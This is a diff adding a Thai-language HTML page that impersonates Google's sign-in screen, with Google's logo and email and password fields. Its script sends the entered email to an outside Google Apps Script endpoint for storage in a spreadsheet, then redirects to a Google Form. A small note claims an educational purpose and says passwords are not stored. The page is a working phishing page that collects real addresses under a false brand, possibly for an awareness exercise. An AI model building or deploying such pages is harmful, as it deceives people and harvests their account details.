@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <title>ลงชื่อเข้าใช้ – Google</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: white;
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    .logo img {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      margin-bottom: 10px;
+      color: #202124;
+      font-weight: 500;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      width: 100%;
+    }
+
+    input[type="submit"] {
+      background: #1a73e8;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background: #155ab6;
+    }
+
+    .note {
+      font-size: 12px;
+      color: #777;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo">
+    </div>
+    <h2>ลงชื่อเข้าใช้</h2>
+    <form id="loginForm">
+      <input type="email" id="email" name="email" placeholder="อีเมล หรือ เบอร์โทรศัพท์" required>
+      <input type="password" name="password" placeholder="รหัสผ่าน" required>
+      <input type="submit" value="ถัดไป">
+    </form>
+    <div class="note">
+      * เว็บไซต์นี้ใช้เพื่อการศึกษาเท่านั้น ไม่มีการเก็บรหัสผ่าน ข้อมูลที่เก็บ: Timestamp และอีเมล
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value;
+
+      // ส่งอีเมลไปยัง Google Apps Script เพื่อเก็บลง Google Sheet
+      fetch("https://script.google.com/macros/s/AKfycbzyaZ8_VCVoC9H5psaU7ky7pG2n6YK2DQUemqUVslYH-BB2nst5pj77HxcBFvCukrjK/exec", {
+        method: "POST",
+        body: new URLSearchParams({ email: email })
+      })
+      .then(() => {
+        // เปลี่ยนเส้นทางไป Google Form
+        window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSdw1yxox-jLS3CzypK50YMago8WwLssvCvKn31f3ZYnGM0XlQ/viewform?usp=header";
+      })
+      .catch((err) => {
+        alert("เกิดข้อผิดพลาด: " + err.message);
+      });
+    });
+  </script>
+</body>
+</html>
